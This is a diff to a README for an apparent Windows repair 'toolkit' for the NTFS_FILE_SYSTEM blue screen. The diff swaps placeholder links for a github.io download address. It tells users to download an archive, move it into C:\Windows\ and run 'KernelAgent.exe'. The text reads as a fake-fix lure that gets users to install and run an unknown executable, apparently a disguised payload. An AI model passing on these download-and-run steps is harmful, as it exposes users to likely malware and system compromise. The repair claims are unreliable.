@@ -2,13 +2,15 @@
 
 This toolkit resolves the NTFS_FILE_SYSTEM (Stop Code: 0x00000024) blue screen error caused by corrupted NTFS.sys, disk read issues, or unstable memory access. Supports Windows 10 and 11.
 
-[![Download Fix Tool](https://img.shields.io/badge/Download-NTFS_FIX-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Fix Tool](https://img.shields.io/badge/Download-NTFS_FIX-blueviolet)](https://fix-ntfs-file-system-win11.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://fix-ntfs-file-system-win11.github.io/.github
+) section  
 2. 📁 **Extract the folder** and move it to `C:\Windows\`  
 3. 🖱 **Run the executable file** `KernelAgent.exe` (required to repair NTFS.sys registry entries and system flags)  
 4. 💽 Let the tool scan and fix system volume flags  
